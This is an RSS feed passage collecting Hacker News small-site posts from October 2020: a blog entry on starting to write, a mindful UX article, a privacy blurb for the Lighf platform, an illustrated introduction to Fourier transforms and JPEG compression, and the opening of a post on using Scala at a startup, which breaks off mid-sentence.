October 30, 2020 | https://www.sandromaglione.com/2020/10/30/the-time-to-write-has-come/ | <a href="https://web.archive.org/web/*/https://www.sandromaglione.com/2020/10/30/the-time-to-write-has-come/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><p>Today I am glad to take a step to the next level, writing.</p><p>Like many other individuals, the feel to write has always been alive inside me. I believe this is a common trait for avid readers. I was part of a large tribe for which “I love reading, and I would love writing as well!”, and then I did not fall throw on my instinct to actually sit and write anything.</p><h2>Where do I come from</h2><p>My journey is not unusual, see if you recognize it. I have never read anything in the first 17 years of my life. What a waste. Then something (no one knows what) clicked and I started reading book after book. Reading became second nature. A day without reading was a waste.</p><p>Then it came to the phase “I want to read X books this year”. I set my goal to one book per week in 2018. I hit the goal. 54 total. I was proud, I was officially a member of an elitè group of readers on the planet.</p><p>After that my rhythm plummeted, and for good reasons. I asked myself “What does it mean reading 54 books a year when the longest was 1100 pages and the shortest 50? It does not make sense!”. So I came to the conclusion that reading just for scoring more pages is dumb. Do not fool yourself. In this new phase, reading became more involved and less urgent.</p><h2>How did I come to writing</h2><p>The last phase I entered is the “Where did I read this concept already?”. Having many books under my belt (no-fiction especially) meant knowing many ideas by heart. I started recognizing a pattern. Many books tell you the same story. Every book is different, but the ideas at its core are often the same. Especially in the no-fiction world I was accustomed to.</p><p>And so my reading pace slowed down even further. I moved more heavily to fiction books. 500-1000 pages books. Trilogies or more. Counting my books read did not make any sense anymore. Now my joy came from the story. Knowing that sitting down to read meant entering a new world. Many authors are masters in the art of making you experience their fictional world to the fullest. What a great skill. How do they do it? They write.</p><hr><p>And here I am now. I write. Why writing? There are many reasons (a Google search would teach you more on the topic pretty fast). Basically, it all comes down to opening the doors of your own thoughts. Learning how to express them in words. Learning how to be expressive. Learning what goes on in your own mind. And why not, sharing your ideas with people.</p><p>Here I am then. Writer. Like many other things, writing must be a habit to nurture. Having a consistent schedule. Not bothering overthinking about the words you write until the end of the session. But you know, if I can read 54 books in a year, writing consistently is not a problem at all.</p> </div></div></div>]]>
            </description>
            <link>https://www.sandromaglione.com/2020/10/30/the-time-to-write-has-come/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24945404</guid>
            <pubDate>Fri, 30 Oct 2020 18:31:16 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How to Apply Mindful UX to Your Daily Life]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24945364">thread link</a>) | @parsecs
<br/>
October 30, 2020 | https://thistooshallgrow.com/blog/6-ways-mindful-ux-daily-life | <a href="https://web.archive.org/web/*/https://thistooshallgrow.com/blog/6-ways-mindful-ux-daily-life">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-block-type="2" id="block-a7abb749998f8defa959"><div><p>Mindful UX protects users' mental health, privacy, and mental state. It's inclusive and accessible. It aims to prevent harm and to help recover from it.</p><h2>Managing the level of interruptions</h2><p>A product has various ways to communicate information. Visual and auditive senses are the most commonly used. Digital items sometimes use touch, for instance with haptic feedback. Some notifications require your attention immediately, for instance if your cooking timer goes off and you don't want to burn your shakshuka. Some are neither urgent nor important. Yes, airline company newsletter, I'm looking at you, especially at the moment. Finally, some don't have any fixed level of urgency or importance: you will adapt them to your contextual needs. My phone is always in silent mode, but I'll activate the ringtone if I'm expecting an important call.</p><p>We can admire Slack's fantastic workflow for notifications. (<a href="https://slack.engineering/reducing-slacks-memory-footprint/" target="_blank">Source</a>)</p></div></div><div data-block-type="2" id="block-yui_3_17_2_1_1604080575308_6648"><div><p>In real life, how do you decide on the way you're communicating news with someone? It can depend on:</p><ul data-rte-list="default"><li><p>Your interlocutor (professional relation, family, long lost friend)</p></li><li><p>The number of interlocutors</p></li><li><p>The nature of the news (sensitive or not)</p></li><li><p>The urgency</p></li><li><p>The importance: paying your taxes might not be urgent if the deadline is 2 months from now, but it is important as you certainly don't want to miss it</p></li></ul><p>Based on all of that, are you going to call, email, text, video call, send a Twitter DM, leave a post-it note? Are you going to send reminders?</p><h2>Limiting distractions, protecting your attention</h2><p>We all know about this, you don't need me to spell it out: everyone is competing for our attention. You might have already taken measures to limit distractions: your phone might be in silent mode, you might even disable some notifications, block ads, disable autoplay, etc. Android and iOS even carry <a href="https://www.theverge.com/2018/6/5/17426922/apple-digital-health-vs-google-wellbeing-time-well-spent-wwdc-2018" target="_blank">native features to help us protect our attention</a>.</p><p>Apart from the digital measures I've just mentioned, there's another way you can mitigate distractions. If you share your physical work space with others - like I am doing in our current lockdown - you can signal when you're available to be interrupted and when you're not. Leave a sign on your door, place an object on your desk, etc.</p><p>There are even different levels for that:</p><ul data-rte-list="default"><li><p>Available</p></li><li><p>Only disturb if urgent</p></li><li><p>Do not disturb under any circumstances</p></li></ul><h2>Paying attention to accessibility</h2><p>An accessible product is a product that's usable by everyone. The quintessence of inaccessible design are Terms &amp; Conditions. Never-ending walls of text with little to no page layout, all written in legalese. For those of you who don't know, "legalese" represents legal lingo that's completely closed off to the uninitiated.</p><p>An easy way to be more mindful of accessibility in your daily life, is to adapt your communication. If you want to use jargon with people who might not be familiar with it, explain what it means - just like I did above with "legalese". In a group discussion, give background and context so that everyone has the same level of information and everyone can follow. When writing up a document, highlight the key information to make it easily scannable.</p><h2>Removing visual clutter</h2><p>We are well aware that visual overstimulation is detrimental for us. I even asked people on Twitter about it, and the results are telling.</p></div></div><div data-block-type="2" id="block-yui_3_17_2_1_1604080575308_11640"><div><p>Whether it's in your room or at your desk, trimming down the visual clutter allows by contrast to shine more light on what's important, on the few things that you decide to leave in sight. Not only does that make it easier for you to find something you're looking for, but it's also nicer and less stressful on the eyes, because you have less visual stimuli.</p><p>The same applies to your digital places. Leaving white space and room to breathe is beneficial and so much more relaxing. Here's what my phone and laptop screens look like: much better than having files and apps filling up the space.</p></div></div><div data-block-type="2" id="block-yui_3_17_2_1_1604080575308_30876"><div><h2>Avoiding cognitive overload</h2><p>Cognitive load refers to the mental effort we have to make to use a product, achieve a task, etc. We've all known someone who had the bad habit of starting Matryoshka sentences - or Russian dolls sentences if you prefer. "<em>I had a call with Tamara, because we have a group chat with Marie, and by the way did you know Marie and Tamara had never met? Because last time we met with Awa and had delicious ice cream, I can give you the address, and it was such a sunny day</em>" and this sentence alone tackled 6 different topics. Yes, some people talk like that, and it exhausts me because I can't follow.</p><p>Some strategies to make it easier:</p><h3>Chunking</h3><p>Do you write phone numbers as 0123456789 or 01.23.45.67.89? Splitting your content in smaller chunks makes it easier to both <a href="https://www.nngroup.com/articles/chunking/" target="_blank">scan</a> and <a href="https://www.zora.uzh.ch/id/eprint/151291/1/Thalmann.et.al.Chunking.final.pdf" target="_blank">memorise</a>.</p><h3>Reducing the number of options</h3><p>You don't have to go all the way and reduce your wardrobe to 15 items, but... I suppose that's the spirit? In UX, this is known as <a href="https://lawsofux.com/hicks-law" target="_blank">Hick's law</a>. Choosing what to have between 10 options will take longer than between 3 options. That won't stop me from having 10 different teas at home though. 😌 This isn't something to apply religiously, just to be aware of and to use whenever relevant.</p><h3><a href="https://www.nngroup.com/articles/recognition-and-recall/" target="_blank">Recognition rather than recall</a></h3><p>Yet another interesting UX principle for your daily life. Recognition leaves cues (e.g. "<em>Are mint &amp; lime in a mojito?</em>”), whereas recall doesn't ("<em>What are the main ingredients in a mojito?</em>"). The end goal of these questions is the same, but the former is easier to answer: you just have to recognise whether the information given to you is accurate.</p><p>You can then make your environment work for you. I leave my keys in the lock, so that I'm naturally prompted to take them with me as I go out, I don't need to remember it. If I want to wear something specific the next day, I'll take it out of the wardrobe and leave it in plain sight. If I need to eat something soon, as it expires the next day, I'll place it on the kitchen counter.</p><h2>Choosing between streaks or flexible goals</h2><p>Several products use streaks to entice you into practicing something daily. Headspace does it for meditation, Github does it with your code commits. Streaks can be useful, but they shouldn't be a default goal for any habit you want to learn. Aiming to be flexible, and to complete a task 3 or 5 times per week, is much more realistic than sticking to it everyday, especially if you're just getting started. Streaks create pressure to perform everyday, while more manageable goals leave room for contigencies.</p><p>Additionally, since you're more likely to complete <a href="https://nesslabs.com/flexible-consistency" target="_blank">flexible goals</a>, you can observe your own progress, which encourages you to keep going. Finally, it's important to differenciate whether your completion of a task comes from pressure or from desire. Daily streaks are more likely to be completed from internal coercion, and malleable goals from desire, because if you don't feel like doing it on Monday, it's no big deal. Listen to yourself, listen to what you feel like doing in the moment, and adapt.</p></div></div></div>]]>
            </description>
            <link>https://thistooshallgrow.com/blog/6-ways-mindful-ux-daily-life</link>
            <guid isPermaLink="false">hacker-news-small-sites-24945364</guid>
            <pubDate>Fri, 30 Oct 2020 18:26:33 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[New social media platform, Lighf, looking forward to welcoming its future users]]>
            </title>
            <description>
<![CDATA[
Score 11 | Comments 4 (<a href="https://news.ycombinator.com/item?id=24945358">thread link</a>) | @imanonymous
<br/>
October 30, 2020 | https://lighf.com/request-lighf/ | <a href="https://web.archive.org/web/*/https://lighf.com/request-lighf/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div text-align:="" center;"=""><p><span>lighf</span> doesn’t store your IP address or any other identifiable data about you. By default your layers (privacy) are to set to <em>None</em> but you can add additional layers.</p>
<p><em>Encrypted</em>, means your email address is encrypted the second you create an account and only unencrypted, with your permission, at times when you need to recover your password.Â&nbsp; The draw back is you won’t be able to get <span>lighf</span> updates by email, only In-App and Push (coming soon).</p>
<p>To go <em>Email-less</em> means no email address is linked to your <span>lighf</span> Account. Like the Encrypted option, you won’t receive any updates by email, only In-App and Push (coming soon). The draw back is that you won’t be able to reset your password or <span>lighf</span>Name (username) or recover your Account.</p>
<p><a title="Tap this link to close." href="#">Got It!</a></p>
</div>
</div></div>]]>
            </description>
            <link>https://lighf.com/request-lighf/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24945358</guid>
            <pubDate>Fri, 30 Oct 2020 18:25:49 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[An Interactive Introduction to Fourier Transforms]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24945150">thread link</a>) | @max10541
<br/>
October 30, 2020 | http://www.jezzamon.com/fourier/index.html | <a href="https://web.archive.org/web/*/http://www.jezzamon.com/fourier/index.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="content">
	<p>Fourier transforms are a tool used in a whole bunch of different things. This is an explanation of what a Fourier transform does, and some different ways it can be useful. And how you can make pretty things with it, like this thing:</p>
<canvas id="self-draw" width="500" height="500"></canvas>
<p>I'm going to explain how that animation works, and along the way explain Fourier transforms!</p>
<p>By the end you should have a good idea about</p>
<ul>
<li>What a Fourier transform does</li>
<li>Some practical uses of Fourier transforms</li>
<li>Some pointless but cool uses of Fourier transforms</li>
</ul>
<p>We're going to leave the mathematics and equations out of it for now. There's a bunch of interesting maths behind it, but it's better to start with what it actually does, and why you'd want to use it first. If you want to know more about the how, there's some further reading suggestions below!</p>
<h2 id="sowhatisthisthing">So what is this thing?</h2>
<p>Put simply, the Fourier transform is a way of splitting something up into a bunch of sine waves. As usual, the name comes from some person who lived a long time ago called Fourier.</p>
<p>Let’s start with some simple examples and work our way up. First up we're going to look at waves - patterns that repeat over time.</p>
<p>Here’s an example wave:</p>
<canvas id="combo-sine-wave" width="500" height="300"></canvas>
<p>This wavy pattern here can be split up into sine waves. That is, when we add up the two sine waves we get back the original wave.</p>
<canvas id="combo-sine-wave-split" width="500" height="500"></canvas>
<p>The Fourier transform is a way for us to take the combined wave, and get each of the sine waves back out. In this example, you can almost do it in your head, just by looking at the original wave.</p>
<p>Why? Turns out a lot of things in the real world interact based on these sine waves. We usually call them the wave's frequencies.</p>
<p>The most obvious example is sound – when we hear a sound, we don’t hear that squiggly line, but we hear the different frequencies of the sine waves that make up the sound.</p>



<p>Being able to split them up on a computer can give us an understanding of what a person actually hears. We can understand how high or low a sound is, or figure out what note it is.</p>
<p>We can also use this process on waves that don't look like they're made of sine waves.</p>
<p>Let's take a look at this guy. It’s called a square wave.</p>
<canvas id="square-wave" width="500" height="300"></canvas>
<p>It might not look like it, but it also can be split up into sine waves.</p>
<canvas id="square-wave-split" width="500" height="500"></canvas>
<p>We need a lot of them this time – technically an infinite amount to perfectly represent it. As we add up more and more sine waves the pattern gets closer and closer to the square wave we started with.</p>
<canvas id="square-wave-build-up" width="500" height="500"></canvas>


<p><em>Drag the slider above to play with how many sine waves there are.</em></p>
<p>Visually, you'll notice that actually the first few sine waves are the ones that make the biggest difference. With the slider halfway, we have the general shape of the wave, but it's all wiggly. We just need the rest of the small ones to make the wigglyness flatten out.</p>
<p>When you listen to the wave, you'll hear the sound get lower, because we're removing the higher frequencies.</p>
<p>This process works like that for any repeating line. Give it a go, try drawing your own!</p>


<p><em>Move the slider to see how as we add more sine waves, it gets closer and closer to your drawing</em></p>
<p>Again, aside from the extra wigglyness, the wave looks pretty similar with just half of the sine waves.</p>
<p>We can actually use the fact that the wave is pretty similar to our advantage. By using a Fourier transform, we can get the important parts of a sound, and only store those to end up with something that's pretty close to the original sound.</p>
<p>Normally on a computer we store a wave as a series of points.</p>
<canvas id="wave-samples" width="500" height="500"></canvas>
<p>What we can do instead is represent it as a bunch of sine waves. Then we can compress the sound by ignoring the smaller frequencies. Our end result won't be the same, but it'll sound pretty similar to a person.</p>
<canvas id="wave-frequencies" width="500" height="500"></canvas>
<p>This is essentially what MP3s do, except they're more clever about which frequencies they keep and which ones they throw away.</p>
<p>So in this case, we can use Fourier transforms to get an understanding of the fundamental properties of a wave, and then we can use that for things like compression.</p>
<p>Ok, now let's dig more into the Fourier transform. This next part looks cool, but also gives you a bit more understanding of what the Fourier transform does. But mostly looks cool.</p>
<h2 id="epicycles">Epicycles</h2>
<p>Now at the start, I said it splits things into sine waves. The thing is, the sine waves it creates are not just regular sine waves, but they’re 3D. You could call them "complex sinusoids". Or just "spirals".</p>
<canvas id="complex-sinusoid" width="500" height="500"></canvas>
<p>If we take a look from the side, they look like sine waves. From front on, though, these look like circles.</p>
<canvas id="complex-sinusoid-turn" width="500" height="500"></canvas>
<p>So far everything we’ve been doing has only required the regular 2D sine waves. When we do a Fourier transform on 2D waves, the complex parts cancel out so we just end up with sine waves.</p>
<p>But we can use the 3D sine waves to make something fun looking like this:</p>
<canvas id="peace-epicycles" width="500" height="500"></canvas>
<p>What’s going on here?</p>
<p>Well, we can think of the drawing as a 3D shape because of the way it moves around in time. If you imagine the hand being drawn by a person, the three dimensions represent where the tip of their pencil is at that moment. The x and y dimensions tell us the position, and then the time dimension is the time at that moment.</p>
<canvas id="peace-3d" width="500" height="500"></canvas>
<p>Now that we have a 3D pattern, we can't use the regular 2D sine waves to represent it. No matter how many of the 2D sine waves we add up, we'll never get something 3D. So we need something else.</p>
<p>What we can use is the 3D spiral sine waves from before. If we add up lots of those, we can get something that looks like our 3D pattern.</p>
<p>Remember, these waves look like circles when we look at them from front on. The name for the pattern of a circle moving around another circle is an epicycle.</p>
<canvas id="peace-build-up" width="500" height="500"></canvas>

<p><em>Use the slider above to control how many circles there are.</em></p>
<p>Like before, we get a pretty good approximation of our pattern with just a few circles. Because this is a fairly simple shape, all the last ones do is make the edges a little sharper.</p>
<p>All this applies to any drawing, really! Now it’s your chance to play around with it.</p>


<p><em>Use the slider to control how many circles are used for your drawing</em></p>
<p>Again, you'll see for most shapes, we can approximate them fairly well with just a small number of circles, instead of saving all the points.</p>
<p>Can we use this for real data? Well, we could! In reality we have another data format called SVG, which probably does a better job for the types of shapes we tend to create. So for the moment, this is really just for making cool little gifs.</p>
<canvas id="fourier-title" width="500" height="300"></canvas>
<p>There is another type of visual data that does use Fourier transforms, however.</p>
<h2 id="jpegs">JPEGs</h2>
<p>Did you know Fourier transforms can also be used on images? In fact, we use it all the time, because that's how JPEGs work! We're applying the same principles to images – splitting up something into a bunch of sine waves, and then only storing the important ones.</p>
<p>Now we're dealing with images, we need a different type of sine wave. We need to have something that no matter what image we have, we can add up a bunch of these sine waves to get back to our original image.</p>
<p>To do that, each of our sine waves will be images too. Instead of a wave that's a line, we now have images with black and white sections. To represent the size of a wave, each image will have more or less contrast.</p>
<p>We can also use these to represent color in the same way, but let's start with black-and-white images for now. To represent colorless images, we need some horizontal wave images,</p>
<p><img id="img-y-component" src="http://www.jezzamon.com/fourier/img/components-4-0.png"></p>
<p>Along with some vertical wave images.</p>
<p><img id="img-x-component" src="http://www.jezzamon.com/fourier/img/components-0-4.png"></p>
<p>By themselves, just horizontal and vertical images aren't enough to represent the types of images we get. We also need some extra ones that you get by multiplying the two together.</p>

<p>For an 8x8 image, here are all the images we need.</p>
<p><img src="http://www.jezzamon.com/fourier/img/components-0-0.png">
    <img src="http://www.jezzamon.com/fourier/img/components-0-1.png">
    <img src="http://www.jezzamon.com/fourier/img/components-0-2.png">
    <img src="http://www.jezzamon.com/fourier/img/components-0-3.png">
    <img src="http://www.jezzamon.com/fourier/img/components-0-4.png">
    <img src="http://www.jezzamon.com/fourier/img/components-0-5.png">
    <img src="http://www.jezzamon.com/fourier/img/components-0-6.png">
    <img src="http://www.jezzamon.com/fourier/img/components-0-7.png">
    <img src="http://www.jezzamon.com/fourier/img/components-1-0.png">
    <img src="http://www.jezzamon.com/fourier/img/components-1-1.png">
    <img src="http://www.jezzamon.com/fourier/img/components-1-2.png">
    <img src="http://www.jezzamon.com/fourier/img/components-1-3.png">
    <img src="http://www.jezzamon.com/fourier/img/components-1-4.png">
    <img src="http://www.jezzamon.com/fourier/img/components-1-5.png">
    <img src="http://www.jezzamon.com/fourier/img/components-1-6.png">
    <img src="http://www.jezzamon.com/fourier/img/components-1-7.png">
    <img src="http://www.jezzamon.com/fourier/img/components-2-0.png">
    <img src="http://www.jezzamon.com/fourier/img/components-2-1.png">
    <img src="http://www.jezzamon.com/fourier/img/components-2-2.png">
    <img src="http://www.jezzamon.com/fourier/img/components-2-3.png">
    <img src="http://www.jezzamon.com/fourier/img/components-2-4.png">
    <img src="http://www.jezzamon.com/fourier/img/components-2-5.png">
    <img src="http://www.jezzamon.com/fourier/img/components-2-6.png">
    <img src="http://www.jezzamon.com/fourier/img/components-2-7.png">
    <img src="http://www.jezzamon.com/fourier/img/components-3-0.png">
    <img src="http://www.jezzamon.com/fourier/img/components-3-1.png">
    <img src="http://www.jezzamon.com/fourier/img/components-3-2.png">
    <img src="http://www.jezzamon.com/fourier/img/components-3-3.png">
    <img src="http://www.jezzamon.com/fourier/img/components-3-4.png">
    <img src="http://www.jezzamon.com/fourier/img/components-3-5.png">
    <img src="http://www.jezzamon.com/fourier/img/components-3-6.png">
    <img src="http://www.jezzamon.com/fourier/img/components-3-7.png">
    <img src="http://www.jezzamon.com/fourier/img/components-4-0.png">
    <img src="http://www.jezzamon.com/fourier/img/components-4-1.png">
    <img src="http://www.jezzamon.com/fourier/img/components-4-2.png">
    <img src="http://www.jezzamon.com/fourier/img/components-4-3.png">
    <img src="http://www.jezzamon.com/fourier/img/components-4-4.png">
    <img src="http://www.jezzamon.com/fourier/img/components-4-5.png">
    <img src="http://www.jezzamon.com/fourier/img/components-4-6.png">
    <img src="http://www.jezzamon.com/fourier/img/components-4-7.png">
    <img src="http://www.jezzamon.com/fourier/img/components-5-0.png">
    <img src="http://www.jezzamon.com/fourier/img/components-5-1.png">
    <img src="http://www.jezzamon.com/fourier/img/components-5-2.png">
    <img src="http://www.jezzamon.com/fourier/img/components-5-3.png">
    <img src="http://www.jezzamon.com/fourier/img/components-5-4.png">
    <img src="http://www.jezzamon.com/fourier/img/components-5-5.png">
    <img src="http://www.jezzamon.com/fourier/img/components-5-6.png">
    <img src="http://www.jezzamon.com/fourier/img/components-5-7.png">
    <img src="http://www.jezzamon.com/fourier/img/components-6-0.png">
    <img src="http://www.jezzamon.com/fourier/img/components-6-1.png">
    <img src="http://www.jezzamon.com/fourier/img/components-6-2.png">
    <img src="http://www.jezzamon.com/fourier/img/components-6-3.png">
    <img src="http://www.jezzamon.com/fourier/img/components-6-4.png">
    <img src="http://www.jezzamon.com/fourier/img/components-6-5.png">
    <img src="http://www.jezzamon.com/fourier/img/components-6-6.png">
    <img src="http://www.jezzamon.com/fourier/img/components-6-7.png">
    <img src="http://www.jezzamon.com/fourier/img/components-7-0.png">
    <img src="http://www.jezzamon.com/fourier/img/components-7-1.png">
    <img src="http://www.jezzamon.com/fourier/img/components-7-2.png">
    <img src="http://www.jezzamon.com/fourier/img/components-7-3.png">
    <img src="http://www.jezzamon.com/fourier/img/components-7-4.png">
    <img src="http://www.jezzamon.com/fourier/img/components-7-5.png">
    <img src="http://www.jezzamon.com/fourier/img/components-7-6.png">
    <img src="http://www.jezzamon.com/fourier/img/components-7-7.png">
</p>
<p>If we take the images, adjust their contrast to the right amount, and then add them up we can create any image.</p>
<p>Let's start with this letter 'A'. It's pretty small, but we need it to be small otherwise we'll end up with too many other images.</p>
<p><img src="http://www.jezzamon.com/fourier/img/a.png"></p>
<p>As we add more and more of these images, we end up with something that becomes closer and closer to the actual image. But I think you'll see the pattern here, as we get a reasonable approximation with just a few of them.</p>
<p><img src="http://www.jezzamon.com/fourier/img/img-buildup-0-0.png">
    <img src="http://www.jezzamon.com/fourier/img/img-buildup-0-1.png">
    <img src="http://www.jezzamon.com/fourier/img/img-buildup-0-2.png">
    <img src="http://www.jezzamon.com/fourier/img/img-buildup-0-3.png">
    <img src="http://www.jezzamon.com/fourier/img/img-buildup-0-4.png">
    <img src="http://www.jezzamon.com/fourier/img/img-buildup-0-5.png">
    <img src="http://www.jezzamon.com/fourier/img/img-buildup-0-6.png">
    <img src="http://www.jezzamon.com/fourier/img/img-buildup-0-7.png">
    <img src="http://www.jezzamon.com/fourier/img/img-buildup-1-0.png">
    <img src="http://www.jezzamon.com/fourier/img/img-buildup-1-1.png">
    <img src="http://www.jezzamon.com/fourier/img/img-buildup-1-2.png">
    <img src="http://www.jezzamon.com/fourier/img/img-buildup-1-3.png">
    <img src="http://www.jezzamon.com/fourier/img/img-buildup-1-4.png">
    <img src="http://www.jezzamon.com/fourier/img/img-buildup-1-5.png">
    <img src="http://www.jezzamon.com/fourier/img/img-buildup-1-6.png">
    <img src="http://www.jezzamon.com/fourier/img/img-buildup-1-7.png">
    <img src="http://www.jezzamon.com/fourier/img/img-buildup-2-0.png">
    <img src="http://www.jezzamon.com/fourier/img/img-buildup-2-1.png">
    <img src="http://www.jezzamon.com/fourier/img/img-buildup-2-2.png">
    <img src="http://www.jezzamon.com/fourier/img/img-buildup-2-3.png">
    <img src="http://www.jezzamon.com/fourier/img/img-buildup-2-4.png">
    <img src="http://www.jezzamon.com/fourier/img/img-buildup-2-5.png">
    <img src="http://www.jezzamon.com/fourier/img/img-buildup-2-6.png">
    <img src="http://www.jezzamon.com/fourier/img/img-buildup-2-7.png">
    <img src="http://www.jezzamon.com/fourier/img/img-buildup-3-0.png">
    <img src="http://www.jezzamon.com/fourier/img/img-buildup-3-1.png">
    <img src="http://www.jezzamon.com/fourier/img/img-buildup-3-2.png">
    <img src="http://www.jezzamon.com/fourier/img/img-buildup-3-3.png">
    <img src="http://www.jezzamon.com/fourier/img/img-buildup-3-4.png">
    <img src="http://www.jezzamon.com/fourier/img/img-buildup-3-5.png">
    <img src="http://www.jezzamon.com/fourier/img/img-buildup-3-6.png">
    <img src="http://www.jezzamon.com/fourier/img/img-buildup-3-7.png">
    <img src="http://www.jezzamon.com/fourier/img/img-buildup-4-0.png">
    <img src="http://www.jezzamon.com/fourier/img/img-buildup-4-1.png">
    <img src="http://www.jezzamon.com/fourier/img/img-buildup-4-2.png">
    <img src="http://www.jezzamon.com/fourier/img/img-buildup-4-3.png">
    <img src="http://www.jezzamon.com/fourier/img/img-buildup-4-4.png">
    <img src="http://www.jezzamon.com/fourier/img/img-buildup-4-5.png">
    <img src="http://www.jezzamon.com/fourier/img/img-buildup-4-6.png">
    <img src="http://www.jezzamon.com/fourier/img/img-buildup-4-7.png">
    <img src="http://www.jezzamon.com/fourier/img/img-buildup-5-0.png">
    <img src="http://www.jezzamon.com/fourier/img/img-buildup-5-1.png">
    <img src="http://www.jezzamon.com/fourier/img/img-buildup-5-2.png">
    <img src="http://www.jezzamon.com/fourier/img/img-buildup-5-3.png">
    <img src="http://www.jezzamon.com/fourier/img/img-buildup-5-4.png">
    <img src="http://www.jezzamon.com/fourier/img/img-buildup-5-5.png">
    <img src="http://www.jezzamon.com/fourier/img/img-buildup-5-6.png">
    <img src="http://www.jezzamon.com/fourier/img/img-buildup-5-7.png">
    <img src="http://www.jezzamon.com/fourier/img/img-buildup-6-0.png">
    <img src="http://www.jezzamon.com/fourier/img/img-buildup-6-1.png">
    <img src="http://www.jezzamon.com/fourier/img/img-buildup-6-2.png">
    <img src="http://www.jezzamon.com/fourier/img/img-buildup-6-3.png">
    <img src="http://www.jezzamon.com/fourier/img/img-buildup-6-4.png">
    <img src="http://www.jezzamon.com/fourier/img/img-buildup-6-5.png">
    <img src="http://www.jezzamon.com/fourier/img/img-buildup-6-6.png">
    <img src="http://www.jezzamon.com/fourier/img/img-buildup-6-7.png">
    <img src="http://www.jezzamon.com/fourier/img/img-buildup-7-0.png">
    <img src="http://www.jezzamon.com/fourier/img/img-buildup-7-1.png">
    <img src="http://www.jezzamon.com/fourier/img/img-buildup-7-2.png">
    <img src="http://www.jezzamon.com/fourier/img/img-buildup-7-3.png">
    <img src="http://www.jezzamon.com/fourier/img/img-buildup-7-4.png">
    <img src="http://www.jezzamon.com/fourier/img/img-buildup-7-5.png">
    <img src="http://www.jezzamon.com/fourier/img/img-buildup-7-6.png">
    <img src="http://www.jezzamon.com/fourier/img/img-buildup-7-7.png">
</p>

<p>For actual JPEG images there are just a few extra details.</p>
<p>The image gets broken up into 8x8 chunks, and each chunk gets split up separately. We use a set of frequencies to determine how light or dark each pixel is, and then another two sets for the color, one for red-green, and another for blue-yellow. The number of frequencies that we use for each chunk determines the quality of the JPEG.</p>
<p>Here's a real JPEG image, zoomed in so we can see the details. When we play with the quality levels we can see this process happen.</p>
<p><img src="http://www.jezzamon.com/fourier/img/cat.png">
</p>
<h2 id="conclusion">Conclusion</h2>
<p>So let's recap:</p>
<ul>
<li>Fourier transforms are things that let us take something and split it up into its frequencies.</li>
<li>The frequencies tell us about some fundamental properties of the data we have</li>
<li>And can compress data by only storing the important frequencies</li>
<li>And we can also use them to make cool looking animations with a bunch of circles</li>
</ul>
<p>This is just scratching the surface into some applications. The Fourier transform is an extremely powerful tool, because splitting things up into frequencies is so fundamental. They're used in a lot of fields, …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="http://www.jezzamon.com/fourier/index.html">http://www.jezzamon.com/fourier/index.html</a></em></p>]]>
            </description>
            <link>http://www.jezzamon.com/fourier/index.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-24945150</guid>
            <pubDate>Fri, 30 Oct 2020 18:08:20 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Use Scala in your early stage startup]]>
            </title>
            <description>
<![CDATA[
Score 6 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24945145">thread link</a>) | @vlehuger
<br/>
October 30, 2020 | https://www.actiondesk.io/blog/why-use-scala | <a href="https://web.archive.org/web/*/https://www.actiondesk.io/blog/why-use-scala">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><p>Why use Scala? We listed the advantages of Scala we see in our startup. See whether the benefits of Scala could help you too.</p><p>1. Focus on what matters: Expressiveness + High order functions</p><p>2. Get less bugs: Statically typed + Clean error management by design</p><p>3. Benefit from JVM ecosystem: Performant libraries + Good tooling environment</p><p>4. Attract talents</p><p>‍</p><p>‍</p><p>Scala is a JVM based language. It’s flexible, you can write code in both imperative or functional styles. Scala is a pragmatic language that mixes the best of functional and object-oriented programming. It basically means that you can create classes to encapsulate state and methods but you can’t mutate them.</p><p>‍</p><p>‍</p><p>The main power of Scala is to let the developers focus on what’s most important.</p><p>‍</p><h2><strong>Expressiveness</strong></h2><p>Running on the JVM, Scala is as powerful as Java but it is way clearer and more concise. It makes the code easier (and faster) to write and read!</p><p>For example, look at how we create a list of string in Java vs Scala:</p><h4><strong>Java:</strong></h4><figure id="w-node-069225ecd5f7-d0a68507"><p><img src="https://uploads-ssl.webflow.com/5de53075747d4101db8251cb/5f8df66d44ec7c4592663ddc_20201019%20Scala%20Article_1.png" loading="lazy" alt="how we create a list of string in Java"></p></figure><h4><strong>Scala:</strong></h4><figure id="w-node-713e2fe2bca1-d0a68507"><p><img src="https://uploads-ssl.webflow.com/5de53075747d4101db8251cb/5f8df6bca2fdb8e00bb006a6_20201019%20Scala%20Article_2.png" loading="lazy" alt="how we create a list of string in Scala"></p></figure><h2><strong>High order function</strong></h2><p>High order functions are functions that abstract some control structure like a loop to update every element of an array.</p><p>They’re the functions we use most in Scala. They work by taking a function as a parameter. Used with anonymous functions, they’re perfect to focus on implementing the business logic instead of juggling with indexes to increment and stop conditions.</p><p>Look at how we can convert this list of string into a list of integers:</p><figure id="w-node-b9f12ec503cb-d0a68507"><p><img src="https://uploads-ssl.webflow.com/5de53075747d4101db8251cb/5f8df77fa26c394e0b5e18b1_20201019%20Scala%20Article_3.png" loading="lazy" alt="how to convert a list of string into a list of ints in Scala"></p></figure><p>‍</p><p>We can also compute the sum of it by using the high-order function fold:</p><figure id="w-node-dc33ae72b25f-d0a68507"><p><img src="https://uploads-ssl.webflow.com/5de53075747d4101db8251cb/5f8df7b68e690322a1f2341e_20201019%20Scala%20Article_4.png" loading="lazy" alt="How to compute the sum by using the high-order function fold in 